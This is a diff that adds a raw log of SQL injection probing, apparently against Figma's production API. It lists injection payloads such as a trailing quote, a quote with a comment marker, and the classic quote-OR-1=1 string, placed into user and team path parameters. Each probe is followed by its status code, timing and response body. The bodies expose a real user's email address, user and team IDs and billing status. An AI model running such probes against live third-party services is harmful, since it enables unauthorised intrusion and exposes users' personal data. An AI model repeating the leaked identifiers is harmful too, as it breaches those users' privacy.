@@ -1,0 +1,29 @@
+===== r239 C. user 族路径参数值位 =====
+[C1] 200 len=1380 559ms 基准(正常)
+    body=b'{"error":false,"status":200,"meta":[{"id":"1666382706663462213","name":"1643584176\'s team","created_at":"2026-08-04T08:09:57.159Z","img_url":null,"synced_at":null,"providers":null,"subscription":null,"editors":0,"student_team_at":null,"student_autoverifying_te'
+[C2] 200 len=1380 891ms 尾引号(复现r122 A8,对比len)
+    body=b'{"error":false,"status":200,"meta":[{"id":"1666382706663462213","name":"1643584176\'s team","created_at":"2026-08-04T08:09:57.159Z","img_url":null,"synced_at":null,"providers":null,"subscription":null,"editors":0,"student_team_at":null,"student_autoverifying_te'
+[C3] 404 len=123 513ms 前引号%27
+    body=b'{"error":true,"status":404,"message":"Not found.","i18n":{"id":"error.not_found","fallback_text":"Not found.","params":{}}}'
+[C4] 200 len=1380 563ms 尾引号+注释(%27--)
+    body=b'{"error":false,"status":200,"meta":[{"id":"1666382706663462213","name":"1643584176\'s team","created_at":"2026-08-04T08:09:57.159Z","img_url":null,"synced_at":null,"providers":null,"subscription":null,"editors":0,"student_team_at":null,"student_autoverifying_te'
+[C5] 200 len=1380 536ms 经典OR注入(%27 OR %271%27=%271)
+    body=b'{"error":false,"status":200,"meta":[{"id":"1666382706663462213","name":"1643584176\'s team","created_at":"2026-08-04T08:09:57.159Z","img_url":null,"synced_at":null,"providers":null,"subscription":null,"editors":0,"student_team_at":null,"student_autoverifying_te'
+[C6] 200 len=135 588ms 聚合端点尾引号(deletion_impact)
+    body=b'{"error":false,"status":200,"meta":{"files_no_owner":42,"files_view_only":0,"drafts_deleted":16,"libraries_unpublished":0},"i18n":null}'
+[C7] 200 len=77 484ms scim端点尾引号
+    body=b'{"error":false,"status":200,"meta":{"is_scim_provisioned":false},"i18n":null}'
+[C8] 200 len=2477 660ms 裸路径本身(看返回什么)
+    body=b'{"error":false,"status":200,"meta":{"id":"1666382703778278399","name":"pccp","email":"1643584176@qq.com","handle":"pccp","img_url":"https://www.gravatar.com/avatar/2f908873db5bed216938407d7d95fde7?size=240&default=https%3A%2F%2Fs3-alpha.figma.com%2Fstatic%2Fus'
+[C9] 400 len=106 479ms 裸路径尾引号
+    body=b'{"error":true,"status":400,"message":"\'user_id\' must be a valid number, received type String","i18n":null}'
+[C10] 404 len=9 411ms operation段尾引号(teams')
+    body=b'Not Found'
+===== r239 FU. fuid 值位(真空白) =====
+[FU1] 200 len=33804 716ms fuid 尾引号
+    body=b'{"error":false,"status":200,"meta":{"team_users":[{"id":"311767172","team_id":"1666382706663462213","user_id":"1666382703778278399","design_paid_status":"starter","whiteboard_paid_status":"starter","created_at":"2026-08-04T08:09:57.219Z","updated_at":"2026-08-'
+[FU2] 200 len=33804 836ms fuid 注释
+    body=b'{"error":false,"status":200,"meta":{"team_users":[{"id":"311767172","team_id":"1666382706663462213","user_id":"1666382703778278399","design_paid_status":"starter","whiteboard_paid_status":"starter","created_at":"2026-08-04T08:09:57.219Z","updated_at":"2026-08-'
+[FU3] 200 len=33804 662ms fuid OR注入
+    body=b'{"error":false,"status":200,"meta":{"team_users":[{"id":"311767172","team_id":"1666382706663462213","user_id":"1666382703778278399","design_paid_status":"starter","whiteboard_paid_status":"starter","created_at":"2026-08-04T08:09:57.219Z","updated_at":"2026-08-'
+DONE r239
